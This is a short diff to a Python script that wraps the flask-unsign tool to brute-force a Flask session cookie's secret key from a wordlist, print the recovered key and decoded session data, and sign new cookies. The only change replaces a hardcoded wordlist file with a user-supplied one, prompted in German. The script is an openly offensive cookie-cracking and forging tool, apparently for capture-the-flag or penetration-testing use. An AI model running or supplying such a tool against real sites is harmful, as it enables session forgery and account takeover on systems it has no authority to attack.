@@ -2,7 +2,7 @@ import subprocess
 import re
 import ast
 
-wordlist = "keys3.txt"
+
 
 def unsign(key, words):
     args = ['flask-unsign', '--unsign', '-c', key, '--wordlist', words, '--no-literal-eval']
@@ -16,6 +16,7 @@ def sign_new_cookie(data, secret):
     return result.stdout
 
 session_key = input("SESSION_KEY TO BRUTEFORCE?: ")
+wordlist = input("Keylist auswählen: ")
 secret, data = unsign(session_key, wordlist)
 print("SECRET_KEY = ", secret)
 print("DATA FOUND = ", data)
